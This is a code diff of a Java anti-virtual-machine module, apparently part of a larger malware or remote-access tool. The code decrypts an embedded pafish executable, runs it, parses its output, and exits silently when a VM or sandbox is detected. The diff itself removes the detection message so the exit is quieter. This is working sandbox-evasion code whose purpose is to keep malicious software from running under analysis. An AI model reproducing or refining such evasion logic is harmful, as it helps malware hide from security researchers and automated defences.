@@ -1,18 +1,18 @@
 package rt.modulos.var;
 
+import comunes.Interfaz;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintWriter;
-import comunes.Interfaz;
 import rt.util.CLRT;
 import rt.util.UtilRT;
 
 public class AVM extends Thread implements Interfaz {
 
-    private boolean avmw, avml;
+    private boolean avmw;
 
     private void run_amvw() {
         if (avmw) {
@@ -21,7 +21,6 @@ public class AVM extends Thread implements Interfaz {
                 InputStream input = cl.descifrar("/avmw.dat");
                 File t = File.createTempFile("avmw", ".exe");
                 t.deleteOnExit();
-//                File tSalida = File.createTempFile("avmw", ".txt");
                 File tSalida = new File("pafish.log");
                 tSalida.deleteOnExit();
                 ByteArrayOutputStream oo = new ByteArrayOutputStream();
@@ -37,7 +36,7 @@ public class AVM extends Thread implements Interfaz {
                 out.close();
 //                Process p = Runtime.getRuntime().exec(new String[]{t.getAbsolutePath(), ">", tSalida.getAbsolutePath()});
                 Process p = Runtime.getRuntime().exec(new String[]{t.getAbsolutePath()});
-                Thread.sleep(2000);//espero un segundo
+                Thread.sleep(2000);//espero dos segundos
                 //escribo un enter que necesita pafish para terminar
                 OutputStream outStream = p.getOutputStream();
                 PrintWriter pWriter = new PrintWriter(outStream);
@@ -48,12 +47,10 @@ public class AVM extends Thread implements Interfaz {
                 p.destroy();
                 p = null;
                 Thread.sleep(1000);//espero 1 segundo
-
                 String salida = UtilRT.getArchivoTexto(tSalida.getAbsolutePath()).toLowerCase();
-
                 salida = salida.replaceAll("using mouse activity ... traced!", "");//ignoro la deteccion por inactividad del mouse porq puede ser de un servidor
                 if (salida.contains("traced")) {
-                    System.out.println("VM DETECTED !!!");
+//                    System.out.println("VM DETECTED !!!");
                     System.exit(0);
                 }
                 t.delete();
@@ -61,7 +58,6 @@ public class AVM extends Thread implements Interfaz {
             } catch (Exception ex) {
 
             }
-
         }
     }
 
@@ -116,9 +112,8 @@ public class AVM extends Thread implements Interfaz {
     }
 
     public void instanciar(Object... parametros) {
-
         avmw = (Boolean) parametros[0];
-        avml = (Boolean) parametros[1];
+//        avml = (Boolean) parametros[1];
     }
 
     public void ejecutar(int opcion, Object... parametros) {
